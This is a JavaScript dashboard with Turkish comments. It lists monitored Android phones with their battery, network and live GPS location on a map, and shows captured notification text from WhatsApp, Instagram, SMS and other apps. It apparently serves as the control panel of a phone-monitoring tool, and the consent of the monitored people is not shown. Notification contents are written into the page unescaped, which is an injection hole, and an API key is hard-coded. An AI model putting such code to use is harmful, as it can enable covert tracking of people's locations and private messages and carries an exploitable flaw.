// Supabase Yapılandırması
const SUPABASE_URL = 'https://ubhixsmtpgvixgsnquzy.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InViaGl4c210cGd2aXhnc25xdXp5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxMTM1MDcsImV4cCI6MjEwMzY4OTUwN30.UBgRfCbOODlA9Dx6P9fIev7jIC8vHkLwdRs668EEEdU';

const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
const container = document.getElementById('devices-container');
const modal = document.getElementById('notifications-modal');
const modalList = document.getElementById('modal-notifications-list');
const modalFilters = document.getElementById('modal-filters');

let devicesData = [];
const mapInstances = {}; 
let currentNotifications = []; // Filtreleme için bellekte tutuyoruz

// --- UYGULAMA LOGOLARI VE İSİMLENDİRME YARDIMCISI ---
function getAppDetails(packageName, defaultName) {
    const pkg = packageName.toLowerCase();
    
    // Uygulama sözlüğü (Renkler ve SVG ikonlar)
    const apps = [
        { keys: ['whatsapp'], name: 'WhatsApp', color: '#25D366', icon: '<path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/>' },
        { keys: ['instagram'], name: 'Instagram', color: '#E1306C', icon: '<path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>' },
        { keys: ['googlequicksearchbox', 'google', 'chrome'], name: 'Google', color: '#4285F4', icon: '<path d="M12.48 10.92v3.28h7.84c-.24 1.84-1.53 3.69-3.96 4.95-2.3 1.34-5.32 1.55-7.9.5-2.83-1.15-5.06-3.66-5.83-6.66-.23-.87-.33-1.78-.33-2.69s.1-1.83.33-2.69c.77-3 3-5.51 5.83-6.66 3.16-1.29 6.71-.85 9.4 1.15l-2.45 2.45c-1.58-1.1-3.69-1.52-5.71-1.02-2.31.57-4.24 2.27-5.11 4.46-.38.96-.58 1.99-.58 3.03s.2 2.07.58 3.03c.87 2.19 2.8 3.89 5.11 4.46 2.08.52 4.31.06 6.04-1.19.98-.71 1.63-1.73 1.9-2.89h-5.26z"/>' },
        { keys: ['messaging', 'mms', 'sms'], name: 'Mesajlar', color: '#1A73E8', icon: '<path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM7 9h2v2H7zm8 0h2v2h-2zm-4 0h2v2h-2z"/>' },
        { keys: ['youtube'], name: 'YouTube', color: '#FF0000', icon: '<path d="M21.58 7.19c-.23-.86-.91-1.54-1.77-1.77C18.25 5 12 5 12 5s-6.25 0-7.81.42c-.86.23-1.54.91-1.77 1.77C2 8.75 2 12 2 12s0 3.25.42 4.81c.23.86.91 1.54 1.77 1.77C5.75 19 12 19 12 19s6.25 0 7.81-.42c.86-.23 1.54-.91 1.77-1.77C22 15.25 22 12 22 12s0-3.25-.42-4.81zM9.5 15.5v-7l6.5 3.5-6.5 3.5z"/>' },
        { keys: ['twitter', 'com.x'], name: 'X (Twitter)', color: '#000000', icon: '<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>' }
    ];

    for (let app of apps) {
        if (app.keys.some(k => pkg.includes(k))) return app;
    }

    // Varsayılan İkon
    return { 
        name: defaultName && !defaultName.includes('.') ? defaultName : (pkg.split('.').pop() || 'Uygulama'), 
        color: '#475569', 
        icon: '<path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/>' 
    };
}

function formatTimeAgo(dateString) {
    if (!dateString) return 'Bilinmiyor';
    const diffInSeconds = Math.floor((new Date() - new Date(dateString)) / 1000);
    if (diffInSeconds < 60) return 'az önce';
    if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)} dk önce`;
    if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)} saat önce`;
    return `${Math.floor(diffInSeconds / 86400)} gün önce`;
}

function checkOnlineStatus(sonGorulme) {
    if (!sonGorulme) return false;
    return Math.floor((new Date() - new Date(sonGorulme)) / 1000) <= 120;
}

// Cihaz Kartı HTML Üretici
function generateDeviceHTML(device) {
    const isOnline = checkOnlineStatus(device.son_gorulme);
    const hasLoc = device.son_enlem != null && device.son_boylam != null;

    return `
        <div class="device-card" id="device-${device.id}">
            <div class="device-header">
                <div class="device-title-wrapper">
                    <div class="device-title">${device.cihaz_adi || 'İsimsiz Cihaz'}</div>
                    <div class="device-subtitle">${device.uretici} ${device.model} • Android ${device.android_surumu}</div>
                </div>
                <div id="status-badge-${device.id}" class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">
                    ${isOnline ? 'Çevrimiçi' : 'Çevrimdışı'}
                </div>
            </div>

            <div class="stats-grid">
                <div class="stat-box">
                    <span class="stat-icon">🔋</span>
                    <div class="stat-info">
                        <span class="stat-label">Pil Durumu</span>
                        <span class="stat-value" id="det-pil-${device.id}">${device.pil_yuzdesi != null ? `%${device.pil_yuzdesi}` : '-'} ${device.sarj_oluyor ? '⚡' : ''}</span>
                    </div>
                </div>
                <div class="stat-box">
                    <span class="stat-icon">📶</span>
                    <div class="stat-info">
                        <span class="stat-label">Ağ Bağlantısı</span>
                        <span class="stat-value" id="det-ag-${device.id}">${device.ag_tipi || '-'}</span>
                    </div>
                </div>
                <div class="stat-box">
                    <span class="stat-icon">📍</span>
                    <div class="stat-info">
                        <span class="stat-label">Konum Hata Payı</span>
                        <span class="stat-value" id="loc-acc-${device.id}">${device.son_konum_dogrulugu ? `±${device.son_konum_dogrulugu.toFixed(1)}m` : '-'}</span>
                    </div>
                </div>
                <div class="stat-box">
                    <span class="stat-icon">🔄</span>
                    <div class="stat-info">
                        <span class="stat-label">Son Güncelleme</span>
                        <span class="stat-value" id="loc-time-${device.id}">${formatTimeAgo(device.guncellenme_tarihi)}</span>
                    </div>
                </div>
            </div>

            <div id="map-${device.id}" class="map-container">
                ${!hasLoc ? 'Harita bilgisi bekleniyor...' : ''}
            </div>
            
            <div class="card-actions">
                <button class="btn" onclick="openNotifications('${device.id}')">
                    🔔 Bildirimleri Gör
                </button>
            </div>

            <div class="footer-info">
                <span id="footer-seen-${device.id}">Son görülme: ${formatTimeAgo(device.son_gorulme)}</span>
                <span>v${device.uygulama_surumu}</span>
            </div>
        </div>
    `;
}

function initMap(device) {
    if (device.son_enlem == null || device.son_boylam == null) return;
    const mapId = `map-${device.id}`;
    const mapEl = document.getElementById(mapId);
    if (!mapEl) return;
    mapEl.innerHTML = ''; 

    const map = L.map(mapId, { zoomControl: false }).setView([device.son_enlem, device.son_boylam], 16);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' }).addTo(map);

    const marker = L.marker([device.son_enlem, device.son_boylam]).addTo(map);
    let circle = null;
    if (device.son_konum_dogrulugu) {
        circle = L.circle([device.son_enlem, device.son_boylam], { radius: device.son_konum_dogrulugu, color: '#3b82f6', fillColor: '#3b82f6', fillOpacity: 0.15, weight: 2 }).addTo(map);
    }
    mapInstances[device.id] = { map, marker, circle };
}

function updateDeviceDOM(device) {
    const card = document.getElementById(`device-${device.id}`);
    if (!card) return renderDevices(); 

    const isOnline = checkOnlineStatus(device.son_gorulme);
    const badge = document.getElementById(`status-badge-${device.id}`);
    if (badge) {
        badge.className = `status-badge ${isOnline ? 'status-online' : 'status-offline'}`;
        badge.innerText = isOnline ? 'Çevrimiçi' : 'Çevrimdışı';
    }

    document.getElementById(`det-pil-${device.id}`).innerText = `${device.pil_yuzdesi != null ? `%${device.pil_yuzdesi}` : '-'} ${device.sarj_oluyor ? '⚡' : ''}`;
    document.getElementById(`det-ag-${device.id}`).innerText = device.ag_tipi || '-';
    document.getElementById(`loc-acc-${device.id}`).innerText = device.son_konum_dogrulugu ? `±${device.son_konum_dogrulugu.toFixed(1)}m` : '-';
    document.getElementById(`loc-time-${device.id}`).innerText = formatTimeAgo(device.guncellenme_tarihi);
    document.getElementById(`footer-seen-${device.id}`).innerText = `Son görülme: ${formatTimeAgo(device.son_gorulme)}`;

    const hasLoc = device.son_enlem != null && device.son_boylam != null;
    if (hasLoc) {
        if (!mapInstances[device.id]) {
            initMap(device);
        } else {
            const { marker, circle } = mapInstances[device.id];
            const newLatLng = [device.son_enlem, device.son_boylam];
            marker.setLatLng(newLatLng);
            if (circle && device.son_konum_dogrulugu) circle.setRadius(device.son_konum_dogrulugu);
        }
    }
}

function renderDevices() {
    if (devicesData.length === 0) {
        container.innerHTML = `<div class="loading-state"><p>Henüz kayıtlı veya aktif cihaz bulunmuyor.</p></div>`;
        return;
    }
    Object.keys(mapInstances).forEach(id => { if (mapInstances[id]) mapInstances[id].map.remove(); delete mapInstances[id]; });
    container.innerHTML = devicesData.map(device => generateDeviceHTML(device)).join('');
    setTimeout(() => devicesData.forEach(device => initMap(device)), 100);
}

// --- BİLDİRİM FİLTRELEME VE GÖSTERİM SİSTEMİ ---
window.openNotifications = async function(deviceId) {
    modal.classList.add('active');
    modalList.innerHTML = '<div class="loading-state"><div class="spinner"></div><p>Bildirimler getiriliyor...</p></div>';
    modalFilters.innerHTML = ''; // Temizle

    const { data, error } = await client
        .from('bildirimler')
        .select('*')
        .eq('cihaz_id', deviceId)
        .order('olusturulma_tarihi', { ascending: false })
        .limit(50);

    if (error) {
        modalList.innerHTML = `<p style="color:var(--danger)">Hata oluştu: ${error.message}</p>`;
        return;
    }
    
    currentNotifications = data || [];
    renderFilters();
    renderNotificationList('Tümü');
};

function renderFilters() {
    if (currentNotifications.length === 0) return;
    
    // Uygulama türlerine göre kategorileri belirle
    const apps = new Set(['Tümü']);
    currentNotifications.forEach(n => {
        const info = getAppDetails(n.paket_adi, n.uygulama_adi);
        apps.add(info.name);
    });

    modalFilters.innerHTML = Array.from(apps).map(appName => `
        <button class="filter-chip ${appName === 'Tümü' ? 'active' : ''}" onclick="applyFilter('${appName}', this)">
            ${appName}
        </button>
    `).join('');
}

window.applyFilter = function(filterName, btnElement) {
    document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
    btnElement.classList.add('active');
    renderNotificationList(filterName);
}

function renderNotificationList(filterName) {
    let filtered = currentNotifications;
    
    if (filterName !== 'Tümü') {
        filtered = currentNotifications.filter(n => getAppDetails(n.paket_adi, n.uygulama_adi).name === filterName);
    }

    if (filtered.length === 0) {
        modalList.innerHTML = '<p class="text-muted" style="text-align:center; padding: 20px;">Bildirim bulunamadı.</p>';
        return;
    }

    modalList.innerHTML = filtered.map(notif => {
        const appInfo = getAppDetails(notif.paket_adi, notif.uygulama_adi);
        const badgeClass = notif.etiket === 'EKLENDI' ? 'notif-badge-added' : 'notif-badge-removed';
        
        return `
            <div class="notification-item">
                <div class="notif-logo" style="background-color: ${appInfo.color}">
                    <svg viewBox="0 0 24 24">${appInfo.icon}</svg>
                </div>
                <div class="notif-content">
                    <div class="notif-header">
                        <span class="notif-app-name" style="color: ${appInfo.color}">${appInfo.name}</span>
                        <span class="${badgeClass}">${notif.etiket}</span>
                    </div>
                    <div class="notif-title">${notif.baslik || 'Yeni Bildirim'}</div>
                    <div class="notif-text">${notif.icerik || 'İçerik bulunmuyor.'}</div>
                    <div class="notif-time">${formatTimeAgo(notif.olusturulma_tarihi)}</div>
                </div>
            </div>
        `;
    }).join('');
}

window.closeNotifications = function() { modal.classList.remove('active'); };

async function fetchDevices() {
    const { data, error } = await client.from('cihazlar').select('*').order('son_gorulme', { ascending: false });
    if (!error) { devicesData = data || []; renderDevices(); }
}

function setupRealtime() {
    client.channel('public:cihazlar')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'cihazlar' }, payload => {
            if (payload.eventType === 'INSERT') { devicesData.unshift(payload.new); renderDevices(); } 
            else if (payload.eventType === 'UPDATE') {
                const index = devicesData.findIndex(d => d.id === payload.new.id);
                if (index !== -1) { devicesData[index] = payload.new; updateDeviceDOM(payload.new); } 
                else { devicesData.push(payload.new); renderDevices(); }
            } else if (payload.eventType === 'DELETE') {
                devicesData = devicesData.filter(d => d.id !== payload.old.id); renderDevices();
            }
        }).subscribe();
}

setInterval(() => {
    devicesData.forEach(device => {
        const locTime = document.getElementById(`loc-time-${device.id}`);
        const seenTime = document.getElementById(`footer-seen-${device.id}`);
        if (locTime) locTime.innerText = formatTimeAgo(device.guncellenme_tarihi);
        if (seenTime) seenTime.innerText = `Son görülme: ${formatTimeAgo(device.son_gorulme)}`;
        
        const isOnline = checkOnlineStatus(device.son_gorulme);
        const badge = document.getElementById(`status-badge-${device.id}`);
        if (badge) {
            badge.className = `status-badge ${isOnline ? 'status-online' : 'status-offline'}`;
            badge.innerText = isOnline ? 'Çevrimiçi' : 'Çevrimdışı';
        }
    });
}, 15000);

fetchDevices();
setupRealtime();
